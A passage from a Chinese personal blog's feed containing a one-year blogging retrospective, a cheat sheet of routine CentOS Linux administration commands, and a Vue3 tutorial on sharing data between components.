    <content type="html"><![CDATA[<div class="note info flat"><p>参考：<a href="https://blog.leonus.cn/2022/oneYear.html">博客一年，我收获了什么？</a></p></div><h2 id="1-前言">1. 前言</h2><p>本站存活也有一年时间了，从当初的小白慢慢变的小有名气。我本人还是比较满意的。<br>其实很多年前我就开始玩博客了，期间用过WordPress，typecho，halo等，但是最终都没能长久的坚持下去。<br>后来我选择了Hexo，搭配上有名的主题Butterfly开启了我的静态博客之路。<br>我没想到我会坚持到现在，更没想到会做到现在这个程度。<br>真正开始经营本站是在7月份(暑假空闲时间较多)，在此之前仅仅只是发了几篇学习笔记。</p><h2 id="2-成就">2. 成就</h2><ul><li><p>从当初的默认界面，到现在的魔改美化。</p></li><li><p>从当初慢的一批的github pages，到现在速度都还不错的服务器+vercel等多部署。</p></li><li><p>从当初的一篇Hello World，到现在的57篇文章(带本篇)</p></li><li><p>从当初的友链只有我自己的主页，到现在的三四十个好朋友。</p></li><li><p>从当初的无人问津，到现在的每天访客20左右。</p></li><li><p>从当初的小白，到现在被别人称为大佬（虚荣心得到了满足）。<br>等等</p></li></ul><h2 id="3-收获">3. 收获</h2><p>那么写博客我收获了什么？</p><h3 id="3-1-技术精进">3.1 技术精进</h3><p>写博客的这几个月（从七月份算起），我以下技能均得到了提升：</p><ul><li><p>CSS</p><p>通过不断的修改样式，修改样式，还是修改样式。css写的是越来越熟练，进步最大。</p></li><li><p>JS</p><p>网站离开了JS就等同于没有了灵魂，随着写的越来越多，熟练度也是大幅度提升。</p></li><li><p>Node</p><p>虽说是静态博客，但是一些功能还是离不开后端的支持，而我最熟悉的后端就是node了，自然水涨船高。</p></li><li><p>网站维护</p><p>网络访问速度优化以及不停的修bug，修bug，修bug。</p></li><li><p>源码阅读能力</p><p>想要玩的花，那就需要阅读一些项目的代码，看得多了慢慢也就看的懂了。</p></li><li><p>编程思维</p><p>源代码读多了之后，大佬们的一些编程的手法、思维等也是学到了不少，受益匪浅。</p></li><li><p>使用第三方库的能力</p><p>当自己想写一个功能时，使用第三方库无疑是最省时省力的办法。</p></li><li><p>阅读文档能力</p><p>文档就是永远的神，接触新项目优先看文档！</p></li><li><p>扒站（这是可以说的吗🤫）</p></li></ul><h3 id="3-2-生活态度转变">3.2 生活态度转变</h3><p>其实做博客不只是为了写给别人看，更重要的通过写的过程让自己成为一名优秀的读者去欣赏他人所写的文章。每一次优质的阅读都会让你受益匪浅。<br>我喜欢阅读那些牛逼哄哄的技术文章，更喜欢阅读那些记录美好生活的文章以及故事。<br>每当我阅读生活文章时，我总能从中感受到生活的美好和温暖。而这些也都在潜移默化的影响着我，从当初的摆烂到现在的热爱生活（偶尔也摆一下），这些文章起了很大的作用。<br>慢慢的我也开始尝试记录生活，给自己看，也是给别人看。治愈自己，也是治愈他人。</p><h3 id="3-3-写作能力提高">3.3 写作能力提高</h3><p>我打小语文就不好，心里纵有万般想法却无法完美的表达，总归是一种遗憾。<br>所以每一次写作对我来说都是一次考验，每一次我都要经历如下心理折磨：</p><ul><li>这里该不该断句？</li><li>用逗号还是句号？</li><li>这个意思用成语怎么说来着？</li><li>这句读写怎么有点别扭？</li><li>这里读者会不会产生歧义？</li><li>还有什么忘掉的没？</li><li>嗯。。。这一句去掉比较好？</li><li>这一句似乎是方言？</li></ul><p>虽然现在写作能力还是不够理想，但是没关系，我正在这一次次的磨练中进步。</p><h2 id="4-后记">4. 后记</h2><p>听说写博客面试会加分？🥴</p><p>(如果哪里读的有问题或者有什么建议又或者有什么其他问题，欢迎在评论区留言)</p>]]></content>
    
    
    <summary type="html">坚持写技术博客一年能有多少收获!</summary>
    
    
    
    <category term="博客" scheme="https://www.777nx.cn/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="Butterfly" scheme="https://www.777nx.cn/tags/Butterfly/"/>
    
  </entry>
  
  <entry>
    <title>Linux命令</title>
    <link href="https://www.777nx.cn/posts/82734d8.html"/>
    <id>https://www.777nx.cn/posts/82734d8.html</id>
    <published>2023-05-15T22:34:32.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>作为一位Java后端开发，怎能不会点Linux命令？总结了一套非常实用的Linux命令（基于CentOS 7.6），希望对大家有所帮助！</p><h2 id="系统服务管理">系统服务管理</h2><h3 id="systemctl">systemctl</h3><blockquote><p><code>systemctl</code>命令是<code>service</code>和<code>chkconfig</code>命令的组合体，可用于管理系统。</p></blockquote><ul><li>输出系统中各个服务的状态：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-units --<span class="built_in">type</span>=service</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_01.e52b2e58.png" alt="img"></p><ul><li>查看服务的运行状态：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_02.756a34ee.png" alt="img"></p><ul><li>关闭服务：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_03.c606063b.png" alt="img"></p><ul><li>启动服务：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start firewalld</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_04.eb8ce98a.png" alt="img"></p><ul><li>重新启动服务（不管当前服务是启动还是关闭）：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart firewalld</span><br></pre></td></tr></table></figure><ul><li>重新载入配置信息而不中断服务：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl reload firewalld</span><br></pre></td></tr></table></figure><ul><li>禁止服务开机自启动：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_05.c5414c77.png" alt="img"></p><ul><li>设置服务开机自启动：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> firewalld</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_06.74fd90ab.png" alt="img"></p><h2 id="文件管理">文件管理</h2><h3 id="ls">ls</h3><p>列出指定目录下的所有文件，列出<code>/</code>目录下的文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_07.366177c2.png" alt="img"></p><h3 id="pwd">pwd</h3><p>获取目前所在工作目录的绝对路径：</p><p><img src="https://img.777nx.cn/test/Linux-pwd.png" alt="Linux-pwd"></p><h3 id="cd">cd</h3><p>改变当前工作目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/Linux-cd.png" alt="Linux-cd"></p><h3 id="date">date</h3><p>显示或修改系统时间与日期；</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> <span class="string">&#x27;+%Y-%m-%d %H:%M:%S&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/Linux-date.png" alt="Linux-date"></p><h3 id="passwd">passwd</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd root</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_11.fc029fa4.png" alt="img"></p><h3 id="su">su</h3><p>改变用户身份（切换到超级用户）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -</span><br></pre></td></tr></table></figure><h3 id="clear">clear</h3><p>用于清除屏幕信息</p><h3 id="man">man</h3><p>显示指定命令的帮助信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man <span class="built_in">ls</span></span><br></pre></td></tr></table></figure><h3 id="who">who</h3><ul><li>查询系统处于什么运行级别：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">who</span> -r</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/Linux-who-1.png" alt="Linux-who-1"></p><ul><li>显示目前登录到系统的用户：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">who</span> -buT</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/Linux-who-2.png" alt="Linux-who-2"></p><h3 id="free">free</h3><p>显示系统内存状态（单位MB）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free -m</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/Linux-free.png" alt="Linux-free"></p><h3 id="ps">ps</h3><ul><li>显示系统进程运行动态：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></figure><ul><li>查看<code>sshd</code>进程的运行动态：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep sshd</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/Linux-ps.png" alt="Linux-ps"></p><h3 id="top">top</h3><p>查看即时活跃的进程，类似Windows的任务管理器。</p><p><img src="https://img.777nx.cn/test/linux_command_16.45769ce0.png" alt="img"></p><h3 id="mkdir">mkdir</h3><p>创建目录：</p><p><img src="https://img.777nx.cn/test/linux_command_17.4c3596ed.png" alt="img"></p><h3 id="more">more</h3><p>用于分页查看文件，例如每页10行查看<code>boot.log</code>文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more -c -10 /var/log/boot.log</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_18.3eed35a4.png" alt="img"></p><h3 id="cat">cat</h3><p>用于查看文件，例如查看Linux启动日志文件文件，并标明行号：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> -Ab /var/log/boot.log</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_19.f00e1482.png" alt="img"></p><h3 id="touch">touch</h3><p>用于创建文件，例如创建<code>text.txt</code>文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> text.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/Linux-touch.png" alt="Linux-touch"></p><h3 id="rm">rm</h3><ul><li>删除文件：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> text.txt</span><br></pre></td></tr></table></figure><ul><li>强制删除某个目录及其子目录：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf testdir/</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/Linux-rm.png" alt="Linux-rm"></p><h3 id="cp">cp</h3><p>用于拷贝文件，例如将<code>test1</code>目录复制到<code>test2</code>目录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /mydata/tes1 /mydata/test2</span><br></pre></td></tr></table></figure><h3 id="mv">mv</h3><p>用于移动或覆盖文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> text.txt text2.txt</span><br></pre></td></tr></table></figure><h2 id="压缩与解压">压缩与解压</h2><h3 id="tar">tar</h3><ul><li>将<code>/etc</code>文件夹中的文件归档到文件<code>etc.tar</code>（并不会进行压缩）：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf /mydata/etc.tar /etc</span><br></pre></td></tr></table></figure><ul><li>用<code>gzip</code>压缩文件夹<code>/etc</code>中的文件到文件<code>etc.tar.gz</code>：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf /mydata/etc.tar.gz /etc</span><br></pre></td></tr></table></figure><ul><li>用<code>bzip2</code>压缩文件夹<code>/etc</code>到文件<code>/etc.tar.bz2</code>：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -jcvf /mydata/etc.tar.bz2 /etc</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/Linux-tar-1.png" alt="Linux-tar-1"></p><ul><li>分页查看压缩包中内容（gzip）：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -ztvf /mydata/etc.tar.gz |more -c -10</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_24.3d771f9d.png" alt="img"></p><ul><li>解压文件到当前目录（gzip）：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf /mydata/etc.tar.gz</span><br></pre></td></tr></table></figure><ul><li>解压文件到指定目录（gzip）：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf /mydata/etc.tar.gz -C /mydata/etc</span><br></pre></td></tr></table></figure><h2 id="磁盘和网络管理">磁盘和网络管理</h2><h3 id="df">df</h3><p>查看磁盘空间占用情况：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span> -hT</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_25.2eadcd66.png" alt="img"></p><h3 id="dh">dh</h3><p>查看当前目录下的文件及文件夹所占大小：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span> -h --max-depth=1 ./*</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/Linux-dh.png" alt="Linux-dh"></p><h3 id="ipconfig">ipconfig</h3><p>显示当前网络接口状态：</p><p><img src="https://img.777nx.cn/test/linux_command_27.1322230c.png" alt="img"></p><h3 id="netstat">netstat</h3><ul><li>查看当前路由信息：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -rn</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_28.01eb6632.png" alt="img"></p><ul><li>查看所有有效TCP连接：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><ul><li>查看系统中启动的监听服务：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_29.497bdcb7.png" alt="img"></p><ul><li>查看处于连接状态的系统资源信息：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -atunp</span><br></pre></td></tr></table></figure><h3 id="wget">wget</h3><p>从网络上下载文件</p><p><img src="https://img.777nx.cn/test/linux_command_30.c77bb975.png" alt="img"></p><h2 id="文件上传下载">文件上传下载</h2><ul><li>安装上传下载工具<code>lrzsz</code>；</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y lrzsz</span><br></pre></td></tr></table></figure><ul><li>上传文件，输入以下命令<code>XShell</code>会弹出文件上传框；</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rz</span><br></pre></td></tr></table></figure><ul><li>下载文件，输入以下命令<code>XShell</code>会弹出文件保存框；</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sz fileName</span><br></pre></td></tr></table></figure><h2 id="软件的安装与管理">软件的安装与管理</h2><h3 id="rpm">rpm</h3><blockquote><p>RPM是<code>Red-Hat Package Manager</code>的缩写，一种Linux下通用的软件包管理方式，可用于安装和管理<code>.rpm</code>结尾的软件包。</p></blockquote><ul><li>安装软件包：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh nginx-1.12.2-2.el7.x86_64.rpm</span><br></pre></td></tr></table></figure><ul><li>模糊搜索软件包：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep nginx</span><br></pre></td></tr></table></figure><ul><li>精确查找软件包：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa nginx</span><br></pre></td></tr></table></figure><ul><li>查询软件包的安装路径：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -ql nginx-1.12.2-2.el7.x86_64</span><br></pre></td></tr></table></figure><ul><li>查看软件包的概要信息：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qi nginx-1.12.2-2.el7.x86_64</span><br></pre></td></tr></table></figure><ul><li>验证软件包内容和安装文件是否一致：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -V nginx-1.12.2-2.el7.x86_64</span><br></pre></td></tr></table></figure><ul><li>更新软件包：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh nginx-1.12.2-2.el7.x86_64</span><br></pre></td></tr></table></figure><ul><li>删除软件包：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -e nginx-1.12.2-2.el7.x86_64</span><br></pre></td></tr></table></figure><h3 id="yum">yum</h3><blockquote><p>Yum是<code>Yellow dog Updater, Modified</code>的缩写，能够在线自动下载RPM包并安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，非常方便！</p></blockquote><ul><li>安装软件包：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install nginx</span><br></pre></td></tr></table></figure><ul><li>检查可以更新的软件包：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum check-update</span><br></pre></td></tr></table></figure><ul><li>更新指定的软件包：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update nginx</span><br></pre></td></tr></table></figure><ul><li>在资源库中查找软件包信息：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum info nginx*</span><br></pre></td></tr></table></figure><ul><li>列出已经安装的所有软件包：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum info installed</span><br></pre></td></tr></table></figure><ul><li>列出软件包名称：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list nginx*</span><br></pre></td></tr></table></figure><ul><li>模糊搜索软件包：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum search nginx</span><br></pre></td></tr></table></figure><h2 id="用户管理">用户管理</h2><h3 id="用户信息查看">用户信息查看</h3><ul><li>查看用户信息：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure><ul><li>用户信息格式如下（密码已过滤）：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用户名:密码:用户标识号:组标识号:组注释性描述:主目录:默认shell</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">macro:x:1000:982:macro:/home/macro:/bin/bash</span><br></pre></td></tr></table></figure><ul><li>查看用户组信息：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/group</span><br></pre></td></tr></table></figure><ul><li>用户组信息格式如下：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 组名:密码:组标识号:组内用户列表</span></span><br><span class="line">root:x:0:</span><br><span class="line">docker:x:982:macro,andy</span><br></pre></td></tr></table></figure><h3 id="passwd-2">passwd</h3><p>用于设置用户密码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd root</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/linux_command_11.fc029fa4.png" alt="img"></p><h3 id="su-2">su</h3><p>改变用户身份（切换到超级用户）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换到root用户</span></span><br><span class="line">su -</span><br><span class="line"><span class="comment"># 切换到fantasy用户</span></span><br><span class="line">su fantasy</span><br></pre></td></tr></table></figure><h3 id="groupadd">groupadd</h3><p>添加用户组，使用<code>-g</code>可以设置用户组的标志号：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -g 1024 fantasyfu</span><br></pre></td></tr></table></figure><h3 id="groupdel">groupdel</h3><p>删除用户组：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupdel fantasyfu</span><br></pre></td></tr></table></figure><h3 id="useradd">useradd</h3><p>添加用户，<code>-u</code>设置标志号，<code>-g</code>设置主用户组：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -u 1024 -g fantasyfu fantasy</span><br></pre></td></tr></table></figure><h3 id="usermod">usermod</h3><p>修改用户所属用户组：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -g docker fantasy</span><br></pre></td></tr></table></figure><h3 id="userdel">userdel</h3><p>删除用户，使用<code>-r</code>可以删除用户主目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel fantasy -r</span><br></pre></td></tr></table></figure><h2 id="最后">最后</h2>]]></content>
    
    
    <summary type="html">还在百度Linux命令？推荐一套我用起来特顺手的命令！</summary>
    
    
    
    <category term="Java" scheme="https://www.777nx.cn/categories/Java/"/>
    
    
    <category term="Linux" scheme="https://www.777nx.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Vue3组件之间的数据共享</title>
    <link href="https://www.777nx.cn/posts/f8f8cbb6.html"/>
    <id>https://www.777nx.cn/posts/f8f8cbb6.html</id>
    <published>2023-05-09T21:48:35.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-组件之间的关系">1. 组件之间的关系</h2><p>在项目开发中，组件之间的关系分为如下3种：</p><ol><li>父子关系</li><li>兄弟关系</li><li>后代关系</li></ol><p><img src="https://img.777nx.cn/test/image-20230509215311561.png" alt=""></p><h2 id="2-父子组件之间的数据共享">2. 父子组件之间的数据共享</h2><p>父子组件之间的数据共享又分为：</p><ol><li><code>父 -&gt; 子</code>共享数据</li><li><code>子 -&gt; 父</code>共享数据</li><li><code>父 &lt;-&gt; 子</code>双向数据同步</li></ol><h3 id="2-1-父组件向子组件共享数据">2.1 父组件向子组件共享数据</h3><p>父组件通过<code>v-bind属性绑定</code>向子组件共享数据。同时，子组件需要使用<code>props</code>接收数据。示例代码如下：</p><p><img src="https://img.777nx.cn/test/image-20230509215706903.png" alt="image-20230509215706903"></p><h3 id="2-2-子组件向父组件共享数据">2.2 子组件向父组件共享数据</h3><p>子组件通过<code>自定义事件</code>的方式向父组件共享数据。示例代码如下：</p><p><img src="https://img.777nx.cn/test/image-20230509215742232.png" alt="image-20230509215742232"></p><h3 id="2-3-父子组件之间数据的双向同步">2.3 父子组件之间数据的双向同步</h3><p>父组件在使用子组件期间，可以使用<code>v-model指令</code>维护组件内外数据的双向同步：</p><p><img src="https://img.777nx.cn/test/image-20230509215830222.png" alt="image-20230509215830222"></p><h2 id="3-兄弟组件之间的数据共享">3. 兄弟组件之间的数据共享</h2><p><code>兄弟组件之间</code>实现数据共享的方案是<code>EventBus</code>。可以借助于第三方的包<code>mitt</code>来创建 <code>eventBus对象</code>，从而实现兄弟组件之间的数据共享。示意图如下：</p><p><img src="https://img.777nx.cn/test/image-20230509215948200.png" alt="image-20230509215948200"></p><h3 id="3-1-安装-mitt-依赖包">3.1 安装 mitt 依赖包</h3><p>在项目中运行如下的命令，安装mitt依赖包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install mitt@2.1.0</span><br></pre></td></tr></table></figure><h3 id="3-2-创建公共的EventBus模块">3.2 创建公共的EventBus模块</h3><p>在项目中创建公共的<code>eventBus模块</code>如下：</p><p><img src="https://img.777nx.cn/test/image-20230509220134562.png" alt="image-20230509220134562"></p><h3 id="3-3-在数据接收方自定义事件">3.3 在<code>数据接收方</code>自定义事件</h3><p>在数据接收方，调用<code>bus.on</code>(‘事件名称’, 事件处理函数)方法<code>注册一个自定义事件</code>。示例代码如下：</p><p><img src="https://img.777nx.cn/test/image-20230509220251394.png" alt="image-20230509220251394"></p><h3 id="3-4-在数据接发送方触发事件">3.4 在<code>数据接发送方</code>触发事件</h3><p>在数据发送方，调用<code>bus.emit</code>(‘事件名称’, 要发送的数据)方法<code>触发自定义事件</code>。示例代码如下：</p><p><img src="https://img.777nx.cn/test/image-20230509220330547.png" alt="image-20230509220330547"></p><h2 id="4-后代关系组件之间的数据共享">4. 后代关系组件之间的数据共享</h2><p>后代关系组件之间共享数据，指的是<code>父节点的组件</code>向其<code>子孙组件</code>共享数据。此时组件之间的嵌套关系比较复杂，可以使用<code>provide</code>和<code>inject</code>实现后代关系组件之间的数据共享。</p><p><img src="https://img.777nx.cn/test/image-20230509220415962.png" alt="image-20230509220415962"></p><h3 id="4-1-父节点通过provide共享数据">4.1 父节点通过<code>provide</code>共享数据</h3><p>父节点的组件可以通过<code>provide方法</code>，对其<code>子孙组件</code>共享数据：</p><p><img src="https://img.777nx.cn/test/image-20230509221324505.png" alt="image-20230509221324505"></p><h3 id="4-2-子孙节点通过inject接收数据">4.2 子孙节点通过<code>inject</code>接收数据</h3><p>子孙节点可以使用<code>inject</code>数组，接收父级节点<code>向下共享的数据</code>。示例代码如下：</p><p><img src="https://img.777nx.cn/test/image-20230509221413094.png" alt="image-20230509221413094"></p><h3 id="4-3-父节点对外共享响应式的数据">4.3 父节点对外共享<code>响应式的数据</code></h3><p>父节点使用provide向下共享数据时，可以结合<code>computed函数</code>向下共享<code>响应式的数据</code>。示例代码如下：</p><p><img src="https://img.777nx.cn/test/image-20230509221523077.png" alt="image-20230509221523077"></p><h3 id="4-4-子孙节点使用响应式的数据">4.4 子孙节点<code>使用</code>响应式的数据</h3><p>如果父级节点共享的是<code>响应式的数据</code>，则子孙节点必须以<code>.value</code>的形式进行使用。示例代码如下：</p><p><img src="https://img.777nx.cn/test/image-20230509221603596.png" alt="image-20230509221603596"></p><h2 id="5-vuex">5. 